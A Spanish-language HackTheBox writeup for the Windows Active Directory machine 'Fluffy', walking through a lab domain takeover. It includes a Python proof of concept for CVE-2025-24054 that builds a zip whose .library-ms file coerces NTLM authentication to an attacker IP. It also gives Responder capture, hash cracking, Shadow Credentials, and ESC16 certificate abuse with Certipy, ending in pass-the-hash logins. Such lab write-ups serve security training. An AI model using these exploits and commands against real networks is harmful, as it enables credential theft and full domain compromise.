+++ 
draft = false
date = 2026-10-10T05:56:37Z
title = "Fluffy Machine - HackTheBox"
description = "Esta es una máquina de nivel easy de la plataforma HackTheBox, en la cual involucra Active Directory"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

---

- Tags: #Machine #Windows #Easy #AD #ADCS

---

# Introducción

Este writeup documenta la resolución de la máquina Windows **Fluffy** en HackTheBox. El entorno simula una brecha asumida en Active Directory, partiendo con credenciales válidas de un usuario de bajo privilegio.

El acceso inicial se obtiene abusando de permisos de escritura sobre un recurso compartido SMB, donde se encuentran archivos que permiten preparar un ataque de coerción NTLM mediante **CVE-2025-24054** (identificada originalmente como CVE-2025-24071). Esto permite capturar el desafío-respuesta NTLMv2 de un segundo usuario del dominio, cuya contraseña es posteriormente recuperada mediante un ataque de diccionario.

Con las nuevas credenciales, se enumeran las ACLs del dominio y se identifica un abuso de permisos `GenericAll` sobre un grupo administrativo, lo que permite unirse a él y heredar permisos `GenericWrite` sobre varias cuentas de servicio. Mediante ataques de _Shadow Credentials_ se compromete una de estas cuentas, obteniendo acceso remoto y la flag de usuario.

Finalmente, se explota una mala configuración en **Active Directory Certificate Services (ADCS)** correspondiente a **ESC16**, donde la extensión de seguridad SID se encuentra deshabilitada en la CA. Esto permite suplantar la identidad del usuario Administrador mediante la manipulación del `userPrincipalName` y la solicitud de un certificado, obteniendo control total del dominio.

# Información previa

Como es común en pentests reales de Windows, comenzaremos la máquina **Fluffy** con credenciales para la siguiente cuenta:

Usuario: `j.fleischman`  
Contraseña: `J0elTHEM4n1990!`.

# Enumeración Nmap

El escaneo de puertos revela servicios típicos de un entorno Windows con Active Directory, incluyendo DNS, Kerberos, LDAP y SMB.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.232.88 -oG allPorts
```

Escaneando los servicios y las versiones que corren en los puertos encontrados anteriormente, se obtienen los siguientes resultados

```bash
nmap -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49696,49712,49725 -sCV 10.129.232.88 -oN portServices
```

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 22:28 -0400
Nmap scan report for 10.129.232.88
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-10 09:27:15Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-10T09:28:46+00:00; +6h58m34s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-10-10T09:28:46+00:00; +6h58m35s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-10-10T09:28:46+00:00; +6h58m34s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-10T09:28:46+00:00; +6h58m35s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-10-10T09:28:07
|_  start_date: N/A
|_clock-skew: mean: 6h58m34s, deviation: 0s, median: 6h58m33s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.80 seconds
```

En el resultado del escaneo, podemos ver el nombre de dominio `fluffy.htb`, además encontramos el nombre del `DomainController` `dc01`, por lo cual procedemos a agregarlo a nuestro `/etc/hosts`:

```bash
echo '10.129.232.88 DC01 DC01.fluffy.htb fluffy.htb' | sudo tee -a /etc/hosts
```

# Enumeración SMB

Primeramente probamos las credenciales proporcionadas inicialmente, para confirmar que estas sean válidas

```bash
netexec smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'
```

y tenemos como resultado que el dominio acepta las credenciales

```bash
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```

Ahora podemos revisar si nuestro usuario tiene acceso a algún recurso compartido por `SMB`.

```bash
netexec smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```

El usuario posee acceso de lectura a los compartidos por defecto del dominio (**IPC$, NETLOGON y SYSVOL**), y además al recurso compartido `IT`, en el cual tiene permisos de _Lectura_ y _Escritura_.

```bash
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
```

Por lo cual accedemos al recurso `IT` con el siguiente comando:

```bash
smbclient //10.129.232.88/IT -U 'fluffy.htb\j.fleischman%J0elTHEM4n1990!'
```

Nos encontramos con diferentes archivos y directorios interesantes:

```bash
smb: \> ls
  .                                   D        0  Sat Oct 10 06:04:34 2026
  ..                                  D        0  Sat Oct 10 06:04:34 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
```

Por lo cual procedemos a crear el directorio `IT`, donde almacenaremos los archivos, y los descargamos todos:

```bash
mkdir IT
cd IT/
smbclient //10.129.232.88/IT -U 'fluffy.htb\j.fleischman%J0elTHEM4n1990!'
smb: \> mask ""
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (479.6 KiloBytes/sec) (average 479.6 KiloBytes/sec)
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (507.3 KiloBytes/sec) (average 496.9 KiloBytes/sec)...
...
exit
```

Con los archivos ya en nuestra máquina atacante, podemos leer `Upgrade_Notice.pdf`, el cual contiene un anuncio interno de FLUFFY sobre la aplicación obligatoria de parches de seguridad para vulnerabilidades divulgadas durante 2025.

<img src="/images/Pasted image 20261010001656.png" style="width:100%; height:auto; display:block; margin:auto;">

El documento está dirigido al departamento de TI e indica que los administradores deben identificar los sistemas afectados, reservar una ventana de mantenimiento en el sistema de gestión de cambios y aplicar las actualizaciones correspondientes.

Entre las vulnerabilidades mencionadas se encuentran:

<img src="/images/Pasted image 20261010001707.png" style="width:100%; height:auto; display:block; margin:auto;">

Si investigamos las dos vulnerabilidades clasificadas como críticas, la más relevante sería la `CVE-2025-24071`. Esta vulnerabilidad permite que, dependiendo del contexto y de cómo se procese un archivo especialmente diseñado, Windows intente autenticarse contra un recurso remoto. De esta forma, un atacante podría capturar el `desafío-respuesta NTLMv2` del usuario que interactúa con el archivo.

**NOTA:** El número del CVE fue cambiado por Microsoft, el CVE que corresponde ahora a esa vulnerabilidad es `CVE-2025-24054`.

Si buscamos por algún `POC` de la vulnerabilidad, encontramos el siguiente script en Python.

```python
import os
import zipfile

def main():
    file_name = input("Enter your file name: ")
    ip_address = input("Enter IP (EX: 192.168.1.162): ")


    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""

    library_file_name = f"{file_name}.library-ms"
    with open(library_file_name, "w", encoding="utf-8") as f:
        f.write(library_content)


    with zipfile.ZipFile("exploit.zip", mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(library_file_name)


    if os.path.exists(library_file_name):
        os.remove(library_file_name)

    print("completed")

if __name__ == "__main__":
    main()
```

El cual lo podemos descargar directamente con `wget`.

```bash
wget https://raw.githubusercontent.com/0x6rss/CVE-2025-24071_PoC/refs/heads/main/poc.py
```

Para utilizarlo es bien simple, solo nos pide el nombre del archivo, y la IP a la cual el usuario en la máquina víctima se tendrá que autenticar:

```bash
python3 poc.py 
Enter your file name: exploit.zip
Enter IP (EX: 192.168.1.162): 10.10.14.48
completed
```

Utilizamos Responder para escuchar en la interfaz de red y capturar posibles intentos de autenticación NTLMv2. Si el usuario interactúa con el archivo malicioso y Windows intenta autenticarse contra nuestro equipo, podremos capturar el desafío-respuesta NTLMv2 correspondiente.

```bash
sudo responder -I tun0         
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|            


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server                [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
```

Por lo cual ahora solo quedaría subir nuestro `exploit.zip` mediante `SMB`, como se muestra a continuación:

```bash
smbclient //10.129.232.88/IT -U 'fluffy.htb\j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.7 kB/s) (average 0.7 kB/s)
```

Transcurridos unos segundos, observamos que el usuario `p.agila` intentó autenticarse contra nuestro equipo. Como resultado, Responder capturó su respuesta de autenticación `NTLMv2`, tal como se muestra a continuación:

```bash
sudo responder -I tun0

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:04880bfb56241242:6E38008C80389AB7C132F4239A2340F3:010100000000000000CF6E9E4658DD01483074EC54F7069200000000020008004F0053005600500001001E00570049004E002D0036005300470058003200410041005A0055003600470004003400570049004E002D0036005300470058003200410041005A005500360047002E004F005300560050002E004C004F00430041004C00030014004F005300560050002E004C004F00430041004C00050014004F005300560050002E004C004F00430041004C000700080000CF6E9E4658DD01060004000200000008003000300000000000000001000000002000000CD0725A276945A97F0274700847BE5E7D32628FB940CB09993DEAC668BA3C090A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E003400380000
00000000000000
```

Una vez capturada la respuesta de autenticación NTLMv2 del usuario `p.agila`, utilizamos John the Ripper para intentar recuperar su contraseña mediante un ataque de diccionario.

```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash_p.agila
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:00 DONE (2026-10-09 23:38) 1.086g/s 4911Kp/s 4911Kc/s 4911KC/s proquis..prod0789
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Obteniendo la contraseña `prometheusx-303` del usuario `p.agila`, ahora con ella podemos intentar enumerar por recursos compartidos nuevos, o intentar conectarnos por `winrm`, pero todo esto es en vano.

# Enumeración de Active Directory

Para enumerar y encontrar vías de movimiento lateral y escalada de privilegios en este entorno AD, utilizaremos la herramienta `BloodHound`.

## Recolectar datos .zip

Como tenemos credenciales de un usuario nuevo válido en el dominio, utilizaremos `bloodhound-python`, para recolectar información en un zip, de la siguiente manera

```bash
bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.129.232.88 -c All --zip
```

Al utilizar por primera vez el comando, nos mostrará un error por el desfase horario entre nuestra máquina atacante y el AD.

Para solucionar esto utilizaremos `faketime` y `ntpdate` de la siguiente forma

```bash
faketime "$(ntpdate -q 10.129.232.88 | cut -d ' ' -f 1,2)" bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.129.232.88 -c All --zip
```

```bash
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 32S
INFO: Compressing output into 20261010064350_bloodhound.zip
```

Así obtenemos nuestro archivo `.zip` que deberemos cargar en `Bloodhound`

```bash
ls -la 20261010064350_bloodhound.zip 
-rw-rw-r-- 1 celero0 celero0 145881 Oct  9 23:45 20261010064350_bloodhound.zip
```

## Preparar docker con Bloodhound

Para crear nuestro contenedor con `Bloodhound` descargaremos el `docker-compose` desde la siguiente página web https://0ut3r.space/2024/04/22/bloodhound-ce-and-docker/

Basta con realizar el siguiente comando para descargarlo

```bash
wget https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml
```

Una vez descargada deberemos iniciar el contenedor con el siguiente comando

```bash
sudo docker-compose up -d
```

Posteriormente accedemos desde nuestro navegador a `localhost:8080` y se nos abrirá la interfaz de `Bloodhound`

<img src="/images/Pasted image 20260306232542.png" style="width:100%; height:auto; display:block; margin:auto;">

En el apartado de correo pondremos `admin`, y para obtener la contraseña habrá que leer los logs de nuestro contenedor con el siguiente comando

```bash
docker-compose logs
```

<img src="/images/Pasted image 20260306232632.png" style="width:100%; height:auto; display:block; margin:auto;">

En este apartado deberemos subir el `.zip` que obtuvimos anteriormente

<img src="/images/Pasted image 20260306232728.png" style="width:100%; height:auto; display:block; margin:auto;">

y luego vamos a `Administration`, y esperamos hasta que aparezca `Complete`

<img src="/images/Pasted image 20260306232824.png" style="width:100%; height:auto; display:block; margin:auto;">

# Análisis de AD con BloodHound

Como disponemos de las credenciales del usuario `p.agila`, procedemos a analizar sus propiedades y los permisos asociados a su cuenta dentro del dominio.

Durante la enumeración, observamos que `p.agila` es miembro del grupo `Service Account Managers`. Asimismo, identificamos que este grupo posee permisos `GenericAll` sobre el grupo `Service Accounts`, lo que le otorga control total sobre el objeto de dicho grupo en Active Directory.

Este permiso puede permitir modificar distintas propiedades del grupo, incluida su membresía (podemos agregar o quitar usuarios del grupo).

<img src="/images/Pasted image 20261010005454.png" style="width:100%; height:auto; display:block; margin:auto;">

Por lo cual procederemos a agregar al usuario `p.agila` al grupo `Service Accounts`, con el siguiente comando:

```bash
net rpc group addmem "Service Accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "fluffy.htb"
```

Para comprobar que nuestro usuario ha sido agregado exitosamente al grupo, podemos utilizar el siguiente comando:

```bash
net rpc group members "Service Accounts" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "fluffy.htb"
```

```bash
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

Y vemos que efectivamente `p.agila` es miembro del grupo `Service Accounts`.

Revisando por los permisos y propiedades asociados al grupo `Service Accounts`, nos encontramos que este grupo posee permisos `GenericWrite` sobre las posibles cuentas de servicio `CA_SVC`, `LDAP_SVC`, y `WINRM_SVC`.

<img src="/images/Pasted image 20261010010827.png" style="width:100%; height:auto; display:block; margin:auto;">

## Shadow Credentials con Certipy

Esto, junto con los demás permisos identificados, podría permitirnos llevar a cabo un ataque de tipo `Shadow Credentials`, mediante el cual podríamos autenticarnos como las cuentas de servicio afectadas y, dependiendo del procedimiento utilizado, obtener material de autenticación asociado a ellas, como su `HASH NT`.

```bash
faketime "$(ntpdate -q 10.129.232.88 | cut -d ' ' -f 1,2)" certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ca_svc'
```

```bash
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a5572100aa244d508cb4cea91d6f5de5'
[*] Adding Key Credential with device ID 'a5572100aa244d508cb4cea91d6f5de5' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'a5572100aa244d508cb4cea91d6f5de5' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

De la misma forma, obtenemos el `HASH NT`, de las demás cuentas de servicio:

```bash
ca_svc: ca0f4f9e9eb8a092addf53bb03fc98c8
winrm_svc: 33bd09dcd697600edf6b3a7af4875767
ldap_svc: 22151d74ba3de931a352cba1f9393a37
```

Ahora con estos `HASH NT`, podemos autenticarnos utilizando la herramienta `evil-winrm`, como se muestra a continuación:

```bash
evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

y obtenemos la `user.txt` en el escritorio de `winrm_svc`:

```bash
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ..
*Evil-WinRM* PS C:\Users\winrm_svc> cd Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
e17a336fcc562c19551662c3a91902d5
```

# Escalada de privilegios

Dado que hemos identificado una posible vía para obtener control sobre la cuenta de servicio `CA_SVC`, cuyo nombre podría hacer referencia a _Certificate Authority Service Account_ (cuenta de servicio de una autoridad de certificación), procedemos a investigar si el dominio dispone de una infraestructura de certificados.

Para ello, utilizamos `Certipy`, una herramienta que permite enumerar y analizar configuraciones de Active Directory Certificate Services (AD CS), con el objetivo de identificar autoridades de certificación, plantillas disponibles y posibles configuraciones inseguras.

```bash
certipy-ad find -u ca_svc@fluffy.htb -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.232.88
```

```bash
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20261010002558_Certipy.txt'
[*] Wrote text output to '20261010002558_Certipy.txt'
[*] Saving JSON output to '20261010002558_Certipy.json'
[*] Wrote JSON output to '20261010002558_Certipy.json'
```

Se confirma la presencia del servicio ADCS (Active Directory Certificate Services) dentro del dominio, lo que indica la existencia de una infraestructura de emisión de certificados.

A partir de esto, se procede a enumerar las plantillas de certificados disponibles con el objetivo de identificar configuraciones inseguras o vulnerabilidades que puedan ser explotadas para escalar privilegios dentro del entorno.

```bash
certipy-ad find -u ca_svc@fluffy.htb -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.232.88 -vulnerable -stdout
```

```bash
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates                                 
[*] Finding certificate authorities
[*] Enumeration output:                                            
Certificate Authorities                                            
  0                                                                
    CA Name                             : fluffy-DC01-CA           
    DNS Name                            : DC01.fluffy.htb          
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb                                                         
    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874                                                             
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:12:16+00:00
...
[!] Vulnerabilities                                            
      ESC16                             : Security Extension is disabled.                                                              
    [*] Remarks                                                    
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.                                                                                                                                      
Certificate Templates                   : [!] Could not find any certificate templates
```

Se identifica una condición compatible con **ESC16**, esta es una vulnerabilidad de configuración en Active Directory Certificate Services (AD CS) que se produce cuando la autoridad de certificación (CA) tiene deshabilitada la extensión de seguridad SID. Esto puede permitir ataques de suplantación de identidad mediante certificados, dependiendo de los permisos y de las políticas de autenticación del dominio.

## Explotación de ESC16

Primero, modificamos temporalmente el `User Principal Name (UPN)` de la cuenta `ca_svc` para asignarle la identidad de `administrator`.

```bash
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'
```

```bash
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

A continuación, solicitamos un certificado mediante AD CS, aprovechando la configuración vulnerable de ESC16, que permite emitirlo sin la extensión de seguridad SID.

```bash
faketime "$(ntpdate -q 10.129.232.88 | cut -d ' ' -f 1,2)" certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -ca 'fluffy-DC01-CA' -template 'User'
```

```bash
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Después, restauramos el UPN original de `ca_svc`.

```bash
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'
```

Utilizamos el certificado obtenido para autenticarnos como `administrator` y recuperar su hash NTLM.

```bash
faketime "$(ntpdate -q 10.129.232.88 | cut -d ' ' -f 1,2)" certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88
```

```bash
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Finalmente, empleamos ese hash para conectarnos al sistema mediante `Evil-WinRM`, obteniendo acceso como administrador y recuperando la flag `root.txt`.

```bash
evil-winrm -i fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

```bash
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
fba315e966551a3f4cd8209163cc2db7
```

# Conclusión

La explotación de Fluffy combina un vector de ataque a nivel de aplicación con abusos clásicos de Active Directory: la coerción NTLM mediante CVE-2025-24054 permite obtener credenciales de un segundo usuario a partir de un recurso SMB con permisos de escritura, el abuso de ACLs (`GenericAll` y `GenericWrite`) junto con Shadow Credentials permite comprometer cuentas de servicio, y finalmente la explotación de ESC16 en ADCS permite suplantar al Administrador del dominio. La combinación de estos vectores permite la toma completa del dominio desde un acceso inicial de bajo privilegio.
